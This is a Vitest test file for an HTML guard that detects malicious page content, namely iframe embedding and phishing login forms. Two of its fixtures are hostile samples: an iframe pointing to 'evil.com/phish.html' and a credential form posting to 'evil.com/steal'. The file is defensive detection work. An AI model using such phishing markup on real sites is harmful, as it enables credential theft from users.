import { describe, it, expect } from "vitest";
import { detectMaliciousHtml } from "../server/features/pages/html-guard";

describe("detectMaliciousHtml", () => {
  it("安全 HTML 应通过", () => {
    const html = `
      <html><body>
        <h1>Hello World</h1>
        <p>正常内容</p>
        <script>console.log("hi")</script>
        <button onclick="alert('ok')">点击</button>
      </body></html>
    `;
    const result = detectMaliciousHtml(html);
    expect(result.safe).toBe(true);
    expect(result.threats).toHaveLength(0);
  });

  it("含 iframe 应被拦截", () => {
    const html = `
      <html><body>
        <iframe src="https://evil.com/phish.html"></iframe>
      </body></html>
    `;
    const result = detectMaliciousHtml(html);
    expect(result.safe).toBe(false);
    expect(result.threats).toHaveLength(1);
    expect(result.threats[0].label).toBe("iframe嵌套");
  });

  it("多个 iframe 应计数", () => {
    const html = `
      <iframe src="a.html"></iframe>
      <iframe src="b.html"></iframe>
    `;
    const result = detectMaliciousHtml(html);
    expect(result.safe).toBe(false);
    expect(result.threats[0].count).toBe(2);
  });

  it("表单+多个钓鱼关键词应被拦截", () => {
    const html = `
      <form action="https://evil.com/steal">
        <input type="text" name="email" placeholder="邮箱">
        <input type="password" name="password" placeholder="密码">
        <button>登录验证</button>
      </form>
    `;
    const result = detectMaliciousHtml(html);
    expect(result.safe).toBe(false);
    expect(result.phishingScore).toBeGreaterThanOrEqual(2);
  });

  it("表单+单个钓鱼关键词应放行", () => {
    const html = `
      <form action="/login">
        <input type="password" name="password">
        <button>登录</button>
      </form>
    `;
    const result = detectMaliciousHtml(html);
    expect(result.safe).toBe(true);
    expect(result.phishingScore).toBe(1);
  });

  it("无表单的钓鱼关键词应放行", () => {
    const html = `
      <p>请输入 password 以验证 verify account</p>
    `;
    const result = detectMaliciousHtml(html);
    expect(result.safe).toBe(true);
    expect(result.phishingScore).toBe(0);
  });

  it("空内容应放行", () => {
    const result = detectMaliciousHtml("");
    expect(result.safe).toBe(true);
  });

  it("纯文本应放行", () => {
    const result = detectMaliciousHtml("这是一段普通文本，没有 HTML 标签");
    expect(result.safe).toBe(true);
  });
});
